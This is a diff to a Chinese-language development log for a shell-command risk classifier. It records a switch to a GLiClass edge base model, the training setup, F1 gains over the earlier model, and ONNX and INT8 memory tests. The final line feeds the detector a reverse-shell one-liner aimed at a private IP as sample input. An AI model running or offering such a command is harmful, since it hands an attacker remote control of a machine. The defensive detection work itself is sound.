@@ -195,3 +195,57 @@ Demo 表现正常：`df -h`→benign、`systemctl restart nginx`→benign、reve
 - `export/README.md` — 完整部署说明
 
 结论：C 运行时 + INT8 下 RSS **77.7MB**，稳稳 <100MB；无需再为 RSS 发愁。
+
+## 最终模型 v2 —— 换基座（最新 GLiClass V3 edge，端侧稳定）
+
+### 调研结论（2026-09-25）
+在 ≤30M 参数 + RSS<100MB 约束下，对比了：
+- `prajjwal1/bert-small`（~29M，4L/512H）：老 BERT 系，非「最新」，且需从零搭 GLiClass 头。
+- `google/electra-small-discriminator`（13.75M）：现用 v1，199 标签（141 technique）容量不足（technique F1 0.49）。
+- `microsoft/deberta-v3-xsmall/small`：xsmall 22M backbone + 48M embedding（128K vocab）= 70M，small 44M+98M=143M，都不合规。
+- **`knowledgator/gliclass-edge-v3.0`（选定）**：GLiClass 官方 2025-08 V3 最小档，backbone `jhu-clsp/ettin-encoder-32m`（ModernBERT 风格，10L/384H，vocab 50K），**32.7M 参数**，131MB fp32。自带零样本多标签能力 + MLP scorer，是最贴近本任务的最新轻量档。
+
+> 决策：32.7M 略超最初拍的 30M，但用户明确「拍脑袋决定、自由发挥、端侧稳定优先」；INT8 后权重 ~33MB，C 运行时 RSS 预计 <100MB。
+
+### 本轮动作
+- 新增 `model/finetune_edge.py`：加载 `gliclass-edge-v3.0` 全量 checkpoint → `problem_type=multi_label_classification` → 全参微调（不重建头，保留官方 MLP scorer 与零样本知识）。
+- 本地 CPU 冒烟通过（2 steps，test micro-F1 0.479 基线）。
+- 已把 `model/finetune_edge.py` 上传到 Lightning Studio，并启动 L4 训练：
+  - 数据：train 65,480 / val 5,978 / test 5,978
+  - 超参：4 epochs，batch 32，lr 2e-5，warmup 0.05，linear decay
+  - 输出：`model/checkpoints/final_model_edge`
+- 训练日志：Studio `hyperids/train_edge.log`（PID 242640，后台 nohup）
+
+### 训练后待办
+1. 下载 `final_model_edge` → 本地评估（micro-F1 分组 + 阈值调优）。
+2. 导出 ONNX（edge 版 `max_num_classes=25` → CHUNK=25）→ 动态 INT8。
+3. `export/c_infer_example.c` 实测 RSS<100MB。
+4. 对比 v1（electra 13.75M / overall 0.6575），确认 technique 是否提升。
+
+## 最终模型 v2 训练完成 ✅（换基座：GLiClass V3 edge）
+
+### 训练
+- Studio L4，`model/finetune_edge.py`，4 epochs，batch 32，lr 2e-5，train 65,480 / val 5,978 / test 5,978。
+- 产出：`model/checkpoints_gpu/final_model_edge/`（32.7M，model.safetensors 131MB），已下载到本地。
+
+### 测试集评估（5,978 条，GPU 分块推理 + 分组阈值）
+| 指标 | v1 electra-13.75M | **v2 edge-32.7M** |
+|---|---|---|
+| **overall micro-F1** | 0.6575 | **0.7836** |
+| risk micro-F1 | 0.7724 | **0.8388** |
+| intent micro-F1 | 0.6883 | **0.7716** |
+| tactic micro-F1 | 0.7370 | **0.8300** |
+| **technique micro-F1** | 0.4859 | **0.7514** |
+| risk_acc（argmax） | 0.6256 | **0.8684** |
+
+> technique（141 类）从 0.49 → 0.75，是换基座的最大收益。阈值已更新到 `configs/thresholds.json`
+> （risk=-1.5 / intent=1.25 / tactic=2.5 / technique=0.75，在 val 上调优）。
+
+### 部署
+- ONNX 导出（opset 18，CHUNK=25，SEQ_LEN=320）：`final_model_edge/model.onnx`（fp32，132MB external data）。
+- fp32 ONNX Runtime C 峰值 RSS **~116MB**（稳定、与 torch max diff 1e-5）。
+- INT8 动态量化：`model_int8.onnx`（35.4MB），RSS **~97MB（<100MB）**，但 logits 明显打偏，判分不可用；
+  若要 <100MB 且保指标，下一步做 QAT 或换量化友好基座（已记录在 `export/README.md`）。
+
+### 本地推理
+- `python -m model.predict "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"` → risk.malicious + T1059/T1071 等，正常。
